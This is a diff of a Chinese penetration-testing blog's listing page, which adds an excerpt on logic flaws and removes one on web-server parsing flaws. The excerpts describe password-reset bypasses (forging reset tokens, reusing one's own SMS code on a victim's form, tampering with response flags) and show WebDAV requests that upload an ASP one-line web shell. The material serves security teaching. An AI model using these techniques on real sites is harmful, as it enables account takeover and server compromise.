@@ -82,6 +82,59 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-31</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。 0x01 密码找回漏洞 测试流程 * 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 * 分析数据包，找到有效数据部分 * 推测数据构造方法 * 构造数据包验证猜测 分类 * 邮箱找回 一般是点击邮件中的链接后会转跳到修密码的页面，这就需要分析链接的token构造了， 可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码 * 手机短信找回 短信找回一般就是4位或6位验证码，暴力猜测吧 * 找回逻辑错误 若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码 * 直接修改密码 在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改 * 本地验证 随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可 * 服务端将验证码返回给浏览器 在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可 * 验证码直接出现在url中 当点击获取验证码时发出的请求链接中直接有code * 密保问题找回 回答密保问题，有时一些答案就在html源码里 0x02 多线程条件竞争漏洞 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。 文件上传 服务端可以sudo apt-get install inotify-tools安装监听文件的软件， 执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化 //uploads.php代码如下，仅供测试： &lt;meta charset='utf-8'&gt; &lt;?php $allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;); $size = 10000000;
+    </p>
+
+    
+    <footer>
+        <a href="/posts/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/">敏感信息泄漏</a></h2>
 
         
@@ -547,59 +600,6 @@
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传之解析漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-20</time>
-            </div>
-
-            
-
-            <div style="padding:2px 5px 2px 0px;">
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 解析漏洞 文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等 0x01 IIS解析漏洞 IIS6.0在解析文件时存在以下两个解析漏洞 1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。 2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。 WebDav漏洞 WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若 支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。 测试步骤如下： 1）通过OPTIONS探测服务器所支持的HTTP方法 请求： OPTIONS / HTTP/1.1 Host: www.xxxx.com 2)通过PUT方法向服务器上传shell 请求： PUT /a.txt HTTP/1.1 Host: www.xxxx.com Content-Length: 30 &lt;%eval request(&quot;chopper&quot;) %&gt; 3)通过Move或Copy方法改名 请求： COPY /a.txt HTTP/1.1 Host: www.xxxx.com Destination: http://www.xxxx.com/cmd.asp 4)用DELETE方法删除文件 请求： DELETE /a.txt HTTP/1.1 Host: www.xxxx.com 注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞 0x02 Apache解析漏洞 在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件&quot;/conf/mime.types&quot;中配置Apache可以识别的文件名 0x03 Nginx解析漏洞 对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php 0x04 PHP CGI解析漏洞 当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问http://www.xxx.com/x.txt/x.php 时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析
-    </p>
-
-    
-    <footer>
-        <a href="/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -645,7 +645,7 @@
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(10)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(57)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(58)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(11)</a></li>
         
@@ -824,7 +824,7 @@
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
-                <sup>3</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
